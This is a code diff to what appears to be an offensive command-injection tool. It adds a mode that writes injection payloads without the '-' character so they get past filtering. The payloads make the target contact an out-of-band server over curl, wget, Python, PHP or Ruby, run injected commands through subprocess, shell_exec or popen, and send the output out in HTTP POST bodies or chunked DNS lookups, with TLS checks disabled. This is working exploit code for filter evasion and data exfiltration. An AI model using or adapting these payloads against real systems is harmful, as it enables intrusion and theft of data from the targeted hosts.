@@ -33,6 +33,13 @@ OR = PIPE + PIPE
 # A bare '+' would be read as a space where the payload is URL-decoded.
 PLUS = "+"
 
+# Whether the run reads a filtered '-' out of its payloads, so what these write must not carry one.
+def dashless():
+  return settings.DASHLESS_TAMPER in settings.MULTI_ENCODED_PAYLOAD and settings.TARGET_OS != settings.OS.WINDOWS
+
+# Clients whose way of carrying output back is spelled with options, and has no other spelling.
+DASHED_EXFILTRATION = ("curl", "wget", "openssl")
+
 """
 The HTTP clients used to reach the out-of-band server, most common first.
 """
@@ -76,6 +83,16 @@ def scheme_allows(transport):
   return True
 
 """
+Report whether a transport is worth asking at all while a '-' is being kept out of the payloads.
+
+Asked of what the transport would send rather than listed by name, so it follows whatever its own
+builder writes: a client whose probe still needs an option is a request that a target stripping the
+character refuses every time, and the sweep sends one of those per boundary.
+"""
+def dash_allows(transport):
+  return not dashless() or "-" not in reach_command(transport, "h")
+
+"""
 The URL a payload sends the target to, over the same scheme the out-of-band server is reached on.
 """
 def _url(hostname, proof=""):
@@ -87,6 +104,22 @@ def _url(hostname, proof=""):
   return scheme + "://" + hostname + port + "/" + proof
 
 """
+Build the command that hands an interpreter its program on standard input, where '-c' would be a '-'.
+
+The program stays inside double quotes, so the shell still does the sum before the interpreter sees
+the URL. A command whose output is to be sent goes in through the environment of the interpreter
+alone, single quoted so nothing in it is expanded here, and the interpreter runs it and streams what
+it prints: the standard input is the program's, an argument would need the '-' being avoided, and
+the output itself would stop at the 128 KB a single environment string can hold.
+"""
+def _stdin_run(interpreter, program, cmd=None):
+  printing = "echo" + settings.SINGLE_WHITESPACE if settings.PRINT_WITH_ECHO else checks.print_value("")
+  run = interpreter
+  if cmd is not None:
+    run = settings.RANDOM_VAR_GENERATOR + "='" + cmd.replace("'", "'\\''") + "'" + settings.SINGLE_WHITESPACE + interpreter
+  return printing + "\"" + program + "\"" + PIPE + run
+
+"""
 Build the Python program a payload runs, reading its body from stdin when a command is being sent.
 
 Python verifies certificates against a CA store the target often does not have, and a failure there
@@ -94,15 +127,23 @@ costs the whole transport, so verification is turned off - the output is still e
 module default rather than passing a context keeps this working on Python older than 3.4.3, where
 'urlopen' takes no context and does not verify in the first place.
 """
-def _python_prog(hostname, from_stdin=False, proof=""):
+def _python_prog(hostname, from_stdin=False, proof="", cmd=None):
+  fed = dashless()
   imports = "import ssl,sys,urllib.request;" if from_stdin else "import ssl,urllib.request;"
+  body = ",data=sys.stdin.buffer.read()" if from_stdin else ""
+  if fed and from_stdin:
+    # The program holds the standard input, so the output it sends comes in through the environment.
+    imports = "import os,ssl,subprocess,urllib.request;"
+    body = (",data=subprocess.Popen(os.environ['" + settings.RANDOM_VAR_GENERATOR +
+            "'],shell=True,stdout=subprocess.PIPE).communicate()[0]")
   relax = ""
   if (settings.OOB_SCHEME or "https") == "https":
     relax = "setattr(ssl,'_create_default_https_context',getattr(ssl,'_create_unverified_context',None));"
-  body = ",data=sys.stdin.buffer.read()" if from_stdin else ""
+  program = imports + relax + "urllib.request.urlopen('" + _url(hostname, proof) + "'" + body + ")"
+  if fed:
+    return _stdin_run(settings.LINUX_PYTHON_INTERPRETER, program, cmd)
   # The program is inside double quotes, so the shell still does the sum before Python sees the URL.
-  return (settings.LINUX_PYTHON_INTERPRETER + " -c \"" + imports + relax +
-          "urllib.request.urlopen('" + _url(hostname, proof) + "'" + body + ")\"")
+  return settings.LINUX_PYTHON_INTERPRETER + " -c \"" + program + "\""
 
 """
 Build the PHP program a payload runs, reading its body from stdin when a command is being sent.
@@ -111,17 +152,22 @@ A target reached over HTTPS is usually one whose PHP has no CA store to check it
 failure there costs the whole transport, so verification is turned off - the body is still
 encrypted. Written with 'array()' rather than the short form, which PHP older than 5.4 cannot read.
 """
-def _php_prog(hostname, from_stdin=False, proof=""):
+def _php_prog(hostname, from_stdin=False, proof="", cmd=None):
+  fed = dashless()
   options = []
   if from_stdin:
-    options.append("'http'=>array('method'=>'POST','content'=>file_get_contents('php://stdin'))")
+    content = "(string)shell_exec(getenv('" + settings.RANDOM_VAR_GENERATOR + "'))" if fed else "file_get_contents('php://stdin')"
+    options.append("'http'=>array('method'=>'POST','content'=>" + content + ")")
   if (settings.OOB_SCHEME or "https") == "https":
     options.append("'ssl'=>array('verify_peer'=>false,'verify_peer_name'=>false)")
   context = ""
   if options:
     context = ",false,stream_context_create(array(" + ",".join(options) + "))"
+  program = "file_get_contents('" + _url(hostname, proof) + "'" + context + ");"
+  if fed:
+    return _stdin_run("php", "<?php " + program, cmd)
   # The program is inside double quotes, so the shell still does the sum before PHP sees the URL.
-  return "php -r \"file_get_contents('" + _url(hostname, proof) + "'" + context + ");\""
+  return "php -r \"" + program + "\""
 
 """
 Build the Ruby program a payload runs, reading its body from stdin when a command is being sent.
@@ -130,12 +176,18 @@ Build the Ruby program a payload runs, reading its body from stdin when a comman
 certificate is not checked, for the same reason it is not checked anywhere else here: the target
 rarely has a store to check it against, and failing on that would cost the whole transport.
 """
-def _ruby_prog(hostname, from_stdin=False, proof=""):
+def _ruby_prog(hostname, from_stdin=False, proof="", cmd=None):
+  fed = dashless()
   url = _url(hostname, proof)
   verb = "post(u.request_uri,STDIN.read)" if from_stdin else "get(u.request_uri)"
+  if fed and from_stdin:
+    verb = "post(u.request_uri,IO.popen(ENV['" + settings.RANDOM_VAR_GENERATOR + "']).read)"
+  program = ("u=URI('" + url + "');h=Net::HTTP.new(u.host,u.port);"
+             "h.use_ssl=(u.scheme=='https');h.verify_mode=OpenSSL::SSL::VERIFY_NONE;h." + verb)
+  if fed:
+    return _stdin_run("ruby", "require 'net/http';require 'openssl';" + program, cmd)
   # The program is inside double quotes, so the shell still does the sum before Ruby sees the URL.
-  return ("ruby -rnet/http -ropenssl -e \"u=URI('" + url + "');h=Net::HTTP.new(u.host,u.port);"
-          "h.use_ssl=(u.scheme=='https');h.verify_mode=OpenSSL::SSL::VERIFY_NONE;h." + verb + "\"")
+  return "ruby -rnet/http -ropenssl -e \"" + program + "\""
 
 """
 Build the 's_client' command a payload runs, writing the request onto the connection itself.
@@ -174,7 +226,8 @@ Build the command that makes the target contact a hostname, carrying a sum for i
 """
 def reach_command(transport, hostname, proof="", separator=OR):
   if transport == "curl":
-    return "curl -s " + _url(hostname, proof)
+    # The progress meter goes to stderr, so '-s' only changes what is printed there.
+    return "curl " + ("" if dashless() else "-s ") + _url(hostname, proof)
   if transport == "wget":
     return "wget -qO- " + _url(hostname, proof)
   if transport == "python":
@@ -217,7 +270,10 @@ def dns_lookup_command(hostname, separator=OR, proof=""):
     commands = ["nslookup " + hostname,
                 "powershell.exe -InputFormat none -Command Resolve-DnsName " + hostname]
   else:
-    commands = ["nslookup " + hostname, "getent hosts " + hostname, "host " + hostname, "ping -c1 " + hostname]
+    commands = ["nslookup " + hostname, "getent hosts " + hostname, "host " + hostname]
+    # 'ping' is the one of the four that needs a '-', and the others have none.
+    if not dashless():
+      commands.append("ping -c1 " + hostname)
   if not separator:
     return commands[0]
   return separator.join(commands)
@@ -305,7 +361,7 @@ def transports():
   # whether a target has one of these is not something a boundary changes. They are asked once a
   # boundary is confirmed instead, through 'upgrade_candidates()'.
   order = [candidate for candidate in order if candidate not in FALLBACK_TRANSPORTS]
-  order = [candidate for candidate in order if scheme_allows(candidate)]
+  order = [candidate for candidate in order if scheme_allows(candidate) and dash_allows(candidate)]
   if menu.options.interpreter and "python" in order:
     order.remove("python")
     order.insert(0, "python")
@@ -439,6 +495,8 @@ def proof(transport, plus=PLUS):
 Report whether a transport can carry command output back.
 """
 def supports_exfiltration(transport):
+  if dashless() and transport in DASHED_EXFILTRATION:
+    return False
   return transport in ("curl", "wget", "python", "powershell", "dns", "php", "ruby", "openssl")
 
 """
@@ -469,6 +527,11 @@ def dns_exfil_command(hostname, cmd, separator=""):
             "nslookup ([string]([int]($i/" + chunk + ")" + PLUS + "1)" + PLUS + "'-'" + PLUS +
             "[string]$t" + PLUS + "'.'" + PLUS + "$c" + PLUS + "'." + hostname + "');"
             "$i" + PLUS + "=" + chunk + "}")
+  if dashless():
+    warn_msg = "The '" + settings.DASHLESS_TAMPER + ".py' tamper script cannot reach the hex encoding the '"
+    warn_msg += "dns' transport reads output out through, whose tools take options spelled with a '-'. "
+    warn_msg += "A target that strips a '-' answers it as it answers a parameter that is not injectable."
+    settings.print_once(warn_msg)
   # The hex goes out as one pipeline, so the payload needs no separator of its own beyond the one
   # under test: 'fold' cuts the chunks, 'cat -n' numbers them, and the tab it numbers with becomes
   # the label separator. 'od' and the tools around it are POSIX, so this holds outside bash as well.
@@ -487,11 +550,16 @@ def dns_exfil_command(hostname, cmd, separator=""):
   # A separator that ends a statement can carry a loop instead, which knows how many chunks there
   # are and says so in every label - the reading end then knows when it has them all. A space after
   # the opening, or '$((' would be read as arithmetic instead of a subshell.
+  # Counted from zero and cut with 'expr', so neither 'cut -c' nor the 'i-1' it would need has a '-'.
+  first, bound = ("0", " -lt ") if dashless() else ("1", " -le ")
+  piece = "$(echo $" + settings.RANDOM_VAR_GENERATOR + "|cut -c$i-$((i+" + str(DNS_CHUNK - 1) + ")))"
+  if dashless():
+    piece = "$(expr \"$" + settings.RANDOM_VAR_GENERATOR + "\" : \".\\{$i\\}\\(.\\{1," + chunk + "\\}\\)\")"
   return (settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + settings.SINGLE_WHITESPACE + encoded + settings.CMD_SUB_SUFFIX + separator +
-          "t=$(( (${#" + settings.RANDOM_VAR_GENERATOR + "} + " + str(DNS_CHUNK - 1) + ") / " + chunk + " ))" + separator + "i=1" + separator + "n=1" + separator +
+          "t=$(( (${#" + settings.RANDOM_VAR_GENERATOR + "} + " + str(DNS_CHUNK - 1) + ") / " + chunk + " ))" + separator + "i=" + first + separator + "n=1" + separator +
           "r(){ " + dns_lookup_command("$1", separator) + separator + "}" + separator +
-          "while [ $i -le ${#" + settings.RANDOM_VAR_GENERATOR + "} ]" + separator + "do " +
-          "r $n-$t.$(echo $" + settings.RANDOM_VAR_GENERATOR + "|cut -c$i-$((i+" + str(DNS_CHUNK - 1) + ")))." + hostname + separator +
+          "while [ $i" + bound + "${#" + settings.RANDOM_VAR_GENERATOR + "} ]" + separator + "do " +
+          "r $n-$t." + piece + "." + hostname + separator +
           "i=$((i+" + chunk + "))" + separator + "n=$((n+1))" + separator + "done")
 
 """
@@ -524,10 +592,16 @@ def exfil_command(transport, hostname, cmd, pipe=PIPE, separator=""):
     # wget cannot post from stdin.
     return "wget -qO- --post-data=\"$" + grouped + "\" " + _url(hostname)
   if transport == "python":
+    if dashless():
+      return _python_prog(hostname, from_stdin=True, cmd=cmd)
     return grouped + pipe + _python_prog(hostname, from_stdin=True)
   if transport == "php":
+    if dashless():
+      return _php_prog(hostname, from_stdin=True, cmd=cmd)
     return grouped + pipe + _php_prog(hostname, from_stdin=True)
   if transport == "ruby":
+    if dashless():
+      return _ruby_prog(hostname, from_stdin=True, cmd=cmd)
     return grouped + pipe + _ruby_prog(hostname, from_stdin=True)
   if transport == "openssl":
     # Handed the command rather than a pipe: the length header has to be written before the body,
